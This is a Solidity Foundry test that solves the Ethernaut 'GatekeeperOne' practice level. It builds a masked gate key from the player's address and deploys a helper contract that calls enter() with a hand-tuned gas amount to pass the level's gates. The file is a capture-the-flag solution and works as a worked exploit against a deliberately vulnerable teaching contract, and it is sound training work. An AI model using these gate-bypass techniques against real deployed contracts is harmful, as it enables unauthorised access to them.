// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/GatekeeperOne.sol";
import "src/levels/GatekeeperOneFactory.sol";
import "forge-std/console.sol";

contract TestGatekeeperOne is BaseTest {
    GatekeeperOne private level;

    constructor() public {
        levelFactory = new GatekeeperOneFactory();
    }

    function setUp() public override {
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        levelAddress = payable(this.createLevelInstance(true));
        level = GatekeeperOne(levelAddress);
        assertEq(level.entrant(), address(0));
    }

    function exploitLevel() internal override {
        bytes8 key = bytes8(uint64(uint160(address(player)))) & 0xFFFFFFFF0000FFFF;
        Caller c = new Caller(level);
        vm.prank(player, player);
        c.call(key);
        assertEq(level.entrant(), player);
    }
}

contract Caller is Test {
    GatekeeperOne private victim;
    address private owner;

    constructor(GatekeeperOne _victim) public {
        victim = _victim;
        owner = msg.sender;
    }

    function call(bytes8 gateKey) external {
        victim.enter{gas: 802929}(gateKey);
    }
}
